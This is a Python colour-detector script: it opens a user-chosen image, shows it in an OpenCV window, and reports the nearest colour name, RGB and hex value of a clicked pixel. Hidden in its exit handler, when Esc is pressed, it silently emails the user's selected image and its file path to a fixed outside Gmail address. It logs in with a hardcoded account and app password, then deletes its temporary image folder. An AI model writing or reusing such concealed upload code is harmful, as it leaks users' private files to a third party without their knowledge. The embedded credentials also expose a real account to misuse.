import cv2
import pandas as pd

# from PIL import Image
import PIL.Image
import os


from tkinter import *
from tkinter import filedialog

def openFile():
    filepath = filedialog.askopenfilename(initialdir="C:\\Users",
                                          title="Please pick an image",
                                          filetypes= (("all files","*.*"),
                                            ("jpeg","*.jpeg"),("jpg","*.jpg"),("png","*.png")
                                            ))

    return filepath

window = Tk()
button = Button(text="Open",command=openFile)
button.pack()
# window.mainloop()

import smtplib
from email.message import EmailMessage
import imghdr
name = True
files=[]

def email_alert(subject, body, to):
    msg = EmailMessage()
    msg.set_content(body)
    msg['subject'] = subject
    msg['to'] = to

    user = "Pikachu0304xd@gmail.com"
    msg['from'] = user
    password = "kismreeqtucjsdik"
    
    for file in files:
        with open(file, 'rb') as f:
            image_data = f.read()
            image_type = imghdr.what(f.name)
            image_name = f.name
        msg.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(user, password)
    server.send_message(msg)
    server.quit()
    

img_path=openFile()

# img_path = input("Enter [full] path of image:- ")
# image = Image.open(img_path)
image = PIL.Image.open(img_path)
# new_image = image.thumbnail((1080, 1080))
new_image = image.resize((1000, 720))
# new_image.save('C:\image_new.png')
rgb_image = new_image.convert("RGB")
try:
    # creating a folder named data
    if not os.path.exists('img_data'):
        os.makedirs('img_data')

    # if not created then raise error
except OSError:
    print('Error: Creating directory of data')
currentframe=1
name = './img_data/image' + str(currentframe) + '.jpg'
files.append(img_path)
rgb_image.save(name,format="JPEG")

img = cv2.imread(name)

# declaring global variables (are used later on)
clicked = False
r = g = b = x_pos = y_pos = 0

# Reading csv file with pandas and giving names to each column
index = ["color", "color_name", "hex", "R", "G", "B"]
csv = pd.read_csv('./Projects/colors.csv', names=index, header=None)

# function to calculate minimum distance from all colors and get the most matching color
def get_color_name(R, G, B):
    minimum = 10000
    for i in range(len(csv)):
        d = abs(R - int(csv.loc[i, "R"])) + abs(G - int(csv.loc[i, "G"])) + abs(B - int(csv.loc[i, "B"]))
        if d <= minimum:
            minimum = d
            cname = csv.loc[i, "color_name"]
    return cname

# function to get x,y coordinates of mouse double click
def draw_function(event, x, y, flags, param):
    if event == cv2.EVENT_LBUTTONDOWN:
        global b, g, r, x_pos, y_pos, clicked
        clicked = True
        x_pos = x
        y_pos = y
        b, g, r = img[y, x]
        b = int(b)
        g = int(g)
        r = int(r)

def rgb_to_hex(rgb):
    return '%02x%02x%02x' % rgb

cv2.namedWindow('image')
cv2.setMouseCallback('image', draw_function)

while True:

    cv2.imshow("image", img)
    if clicked:

        # cv2.rectangle(image, start point, endpoint, color, thickness)-1 fills entire rectangle
        cv2.rectangle(img, (20, 20), (950, 60), (b, g, r), -1)

        # Creating text string to display( Color name and RGB values )
        text =get_color_name(r, g, b) + ' R=' + str(r) + ' G=' + str(g) + ' B=' + str(b) + '  Hex= #' + rgb_to_hex((r,g,b))

        # cv2.putText(img,text,start,font(0-7),fontScale,color,thickness,lineType )
        cv2.putText(img, text, (50, 50), 2, 0.8, (255, 255, 255), 2, cv2.LINE_AA)

        # For very light colours we will display text in black colour
        if r + g + b >= 600:
            cv2.putText(img, text, (50, 50), 2, 0.8, (0, 0, 0), 2, cv2.LINE_AA)

        clicked = False

    # Break the loop when user hits 'esc' key
    if cv2.waitKey(20) & 0xFF == 27:
        email_alert("Colour Detector pic", "Pic opened is:- "+img_path+"\n\n", "omdhawan02@gmail.com")
        for folder in ['img_data']:
            for file in os.listdir(folder):
                file_path = os.path.join(folder, file)
                if os.path.isfile(file_path):
                    os.unlink(file_path)
        os.rmdir("img_data")
        break
    
# try:
#     path='.\img_data'
#     os.remove(path)
#     print("% s removed successfully" % path)
# except OSError as error:
#     print(error)
#     print("File path can not be removed")
    
cv2.destroyAllWindows()
